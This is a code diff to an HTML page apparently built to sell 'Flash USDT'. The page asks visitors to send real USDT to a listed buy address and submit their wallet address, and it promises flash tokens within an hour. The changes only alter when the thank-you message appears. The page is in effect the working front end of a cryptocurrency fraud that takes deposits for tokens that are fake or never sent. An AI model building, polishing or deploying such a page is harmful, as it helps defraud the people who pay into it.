@@ -35,13 +35,14 @@
     .calculator { margin-top: 1rem; text-align: center; }
     .calculator p { margin: 1rem 0; font-size: 1rem; }
     .calculator input { width: 4rem; text-align: center; }
+    #thankyouMsg { display: none; color: #fff; margin-top: 1rem; text-align: center; }
   </style>
 </head>
 <body>
   <div class="box">
     <h2>GET FLASH USDT</h2>
 
-    <form name="usdt-form" method="POST" data-netlify="true" action="?submitted=true">
+    <form name="usdt-form" method="POST" data-netlify="true">
       <input type="hidden" name="form-name" value="usdt-form">
 
       <label for="buyAddress">Buy Address (TRC20) (Send Your USDT Here):</label>
@@ -52,9 +53,8 @@
       <label for="usdtAddress">Your USDT Address:</label>
       <input type="text" id="usdtAddress" name="usdtAddress" placeholder="Enter your TRC20 address" required>
 
-      <!-- Submit and thank you under address -->
       <button type="submit">Submit</button>
-      <div id="thankyouMsg" style="display:none; color:#fff; margin-top:1rem; text-align:center;">
+      <div id="thankyouMsg">
         <p>If you have sent the USDT to Buy Address, your Flash USDT will be sent to you in 15 minutes to 1 hour. Please wait patiently.</p>
         <p>Thank You</p>
       </div>
@@ -73,6 +73,7 @@
     const deposit = document.getElementById('deposit');
     const outputVal = document.getElementById('outputVal');
     const thankyou = document.getElementById('thankyouMsg');
+    const form = document.forms['usdt-form'];
 
     function updateOutput() {
       const val = parseFloat(deposit.value) || 0;
@@ -81,9 +82,10 @@
     deposit.addEventListener('input', updateOutput);
     updateOutput();
 
-    if (location.search.includes('submitted=true')) {
+    form.addEventListener('submit', function() {
+      // Show thank you message after submit
       thankyou.style.display = 'block';
-    }
+    });
   </script>
 </body>
 </html>
